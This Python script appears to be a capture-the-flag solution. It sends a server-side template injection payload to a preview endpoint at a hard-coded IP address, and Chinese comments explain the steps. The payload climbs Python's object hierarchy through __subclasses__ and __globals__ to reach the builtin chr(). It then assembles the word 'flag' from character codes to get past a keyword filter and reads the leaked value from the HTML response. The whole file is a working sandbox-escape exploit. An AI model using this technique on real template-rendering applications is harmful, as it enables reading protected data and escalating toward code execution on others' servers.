# -*- coding: utf-8 -*-
import html
import re

import requests


url = "http://39.105.213.28:49104/preview"

# 对象链定位到 BuiltinBridge 类的 chr 函数
chain = "''.__class__.__base__.__subclasses__()[117].__init__.__globals__['__builtins__']['chr']"

# 用 chr() 拼接 "flag" 四个字母绕过关键字过滤
# chr(102)='f', chr(108)='l', chr(97)='a', chr(103)='g'
payload = "{{doc.get(%s(102)+%s(108)+%s(97)+%s(103))}}" % (
    chain, chain, chain, chain,
)

resp = requests.post(url, data={"tpl": payload}, timeout=10)

# 从返回的 HTML 中提取 <pre> 标签内的内容
match = re.search(r"<pre>(.*?)</pre>", resp.text, re.S)
if match:
    result = html.unescape(match.group(1)).strip()
    print(f"Flag: {result}")
else:
    print("未找到 flag，响应内容：")
    print(resp.text)

